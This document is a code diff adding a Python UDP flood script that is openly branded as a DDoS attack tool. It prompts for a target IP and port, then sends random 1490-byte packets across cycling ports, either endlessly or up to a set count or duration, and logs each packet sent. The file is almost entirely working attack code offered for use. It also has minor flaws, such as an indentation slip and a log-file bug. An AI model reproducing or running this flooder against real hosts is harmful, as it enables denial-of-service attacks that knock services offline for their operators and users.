@@ -1,0 +1,82 @@
+import sys
+import os
+import time
+import socket
+import random
+from datetime import datetime
+
+def print_anonymous_mask():
+   os.system("clear")
+    mask = """
+   _____ _           _   _____     _           
+  / ____| |         | | |  __ \   | |          
+ | (___ | |__   __ _| |_| |__) |__| |_   _ ___ 
+  \___ \| '_ \ / _` | __|  ___/ _ \ | | | / __|
+  ____) | | | | (_| | |_| |  |  __/ | |_| \__ \\
+ |_____/|_| |_|\__,_|\__|_|   \___|_|\__,_|___/
+    """
+    print(mask)
+    time.sleep(3)
+
+def print_banner():
+    os.system("clear")
+    os.system("figlet DDos Attack")
+
+def get_user_input():
+    print("Author   : Kamil Paczkowski")
+
+    ip = input("IP Target : ")
+    port = int(input("Port       : "))
+    return ip, port
+
+def start_attack(ip, port, num_packets=None, duration=None, log_file=None):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+
+    print_anonymous_mask()
+    print_banner()
+    print("[                    ] 0% ")
+    time.sleep(5)
+    print("[=====               ] 25%")
+    time.sleep(5)
+    print("[==========          ] 50%")
+    time.sleep(5)
+    print("[===============     ] 75%")
+    time.sleep(5)
+    print("[====================] 100%")
+    time.sleep(3)
+
+    sent = 0
+    try:
+        with open(log_file, 'a') as log:
+            start_time = time.time()
+            while True:
+                sock.sendto(bytes, (ip, port))
+                sent += 1
+                port += 1
+                log.write(f"Sent {sent} packet to {ip} through port:{port}\n")
+                print("Sent %s packet to %s through port:%s" % (sent, ip, port))
+                if port == 65534:
+                    port = 1
+
+                if num_packets and sent >= num_packets:
+                    break
+
+                if duration and (time.time() - start_time) >= duration:
+                    break
+    except KeyboardInterrupt:
+        print("\n[+] Attack interrupted by user. Exiting...")
+    except Exception as e:
+        print(f"[-] An error occurred: {e}")
+
+if __name__ == "__main__":
+    try:
+        ip, port = get_user_input()
+        num_packets = int(input("Number of packets (press Enter for continuous attack): ") or 0)
+        duration = int(input("Duration of attack in seconds (press Enter for continuous attack): ") or 0)
+        log_file = input("Log file (press Enter to skip logging): ") or None
+
+        start_attack(ip, port, num_packets=num_packets, duration=duration, log_file=log_file)
+    except Exception as e:
+        print(f"[-] An error occurred: {e}")
+
